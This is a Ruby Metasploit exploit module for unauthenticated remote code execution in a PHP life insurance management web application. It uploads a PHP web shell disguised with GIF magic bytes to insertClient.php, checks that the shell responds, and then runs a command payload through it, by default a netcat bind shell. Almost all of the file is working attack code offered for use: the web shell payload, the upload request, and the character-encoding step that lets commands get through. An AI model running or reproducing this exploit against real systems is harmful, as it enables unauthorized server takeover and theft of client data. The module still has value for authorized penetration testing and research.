##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'rex/text'

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStager

    def initialize(info = {})
      super(
        update_info(
            info,
            'Name' => 'AEGON LIFE Life Insurance Management System v1.0 File Upload Unauthenticated RCE',
            'Description' => 'An arbitrary file upload vulnerability in Aegon Life v1.0 allows attackers to execute arbitrary code via uploading a crafted PHP file by adding image/gif magic bytes in payload.',
            'License' => MSF_LICENSE,
            'Author' => [ 
                'Keelan Cross', # msf module
                'ASLAM ANWAR MAHIMKAR', # original PoC, analysis
            ],
            'References' => [
                [ 'URL', 'https://www.exploit-db.com/exploits/52045' ]
            ],
            'Platform' => 'php',
            'Targets' => [
                [
                    'Unix Command',
                    {
                        'Platform' => ['linux', 'unix'], # linux and unix have different cmd payloads, this gives you more options
                        'CmdStagerFlavor' => [ 'wget', 'curl','echo' ],
                        'Arch' => ARCH_CMD,
                        'Type' => :unix_cmd, # Running a command - this would be `:linux_dropper` for a cmdstager dropper
                        'DefaultOptions' => {
                            'PAYLOAD' => 'cmd/unix/bind_netcat',
                            'RPORT' => 80,
                        }
                    }
                ]
            ],
            'Payload' => {
                'BadChars' => "\x00"
            },
            'Privileged' => false,
            'DisclosureDate' => '',
            'Notes' => {
                'Stability' => [CRASH_SAFE],
                'Reliability' => [REPEATABLE_SESSION],
                'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
            },
        )
      )

      register_options(
        [        
			Opt::RPORT(80),
			OptString.new('TARGETURI', [ true, 'The URI of the LIMS application.', '/lims/'])
        ]
      )
    end
  
    def check
      # For the check command
    end

    def execute_command(cmd, file, _opts = {})
    cleanedCmd = filter_bad_chars(cmd)
    print_status('Cleaned cmd: ' + cleanedCmd)
    res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, 'uploads', "#{file}.php"),
        'encode_params' => false,
        'vars_get' => {
        'cmd' => cleanedCmd,
        }
    })

    #print_status('Response:' + res.body)
    end

    def filter_bad_chars(cmd)
        cmd.gsub!(/chmod \+x/, 'chmod 777')
        cmd.gsub!(/;/, ' %26%26 ')
        cmd.gsub!(/ /, '+')
        cmd.gsub!(/&/, '%26')
        cmd.gsub!(/\|/, '%7C')
        cmd.gsub!(/>/, '%3E')
        cmd.gsub!(/</, '%3C')
        cmd.gsub!(/"/, '%22')
        cmd.gsub!(/'/, '%27')
        cmd.gsub!(/\\/, '%5C')
        return cmd
    end
      
  
    def exploit
        # Main function
        begin
            random_file = Rex::Text.rand_text_alpha(10)
            print_status('Random File String: ' + random_file)
            webpayload = "GIF89a;'<?php echo shell_exec($_GET[\'cmd\']); ?>'"

            print_status('Attempting to upload PHP web shell...')

            data = Rex::MIME::Message.new
            data.add_part(webpayload, 'text/php', nil, "form-data; name=\"fileToUpload\"; filename=\"#{random_file}.php\"")
            data.add_part('', nil, nil, 'form-data; name="agent_id"')

            res = send_request_cgi({
                'method' => 'POST',
                'uri'    => normalize_uri(target_uri.path, 'insertClient.php'),
                'ctype'  => "multipart/form-data; boundary=#{data.bound}",
                'data'   => data.to_s
            })

            print_status('Verifying shell upload...')
            res = send_request_cgi({
                'method' => 'GET',
                'uri'    => normalize_uri(target_uri.path, 'uploads', "#{random_file}.php"),
                'vars_get' => {
                'cmd' => "echo #{random_file}"
                }
            })

            if res && res.body.include?(random_file)
                print_good('Shell upload verified!')
                print_status('Attempting to grant Metasploit CMD execution...')
                execute_command(payload.encoded, random_file)
            else
                fail_with(Failure::NotFound,'Shell upload verification failed.')
            end
        rescue => e
            print_error("An unexpected error occurred: #{e.message}")
            return
        end
    end
  
  end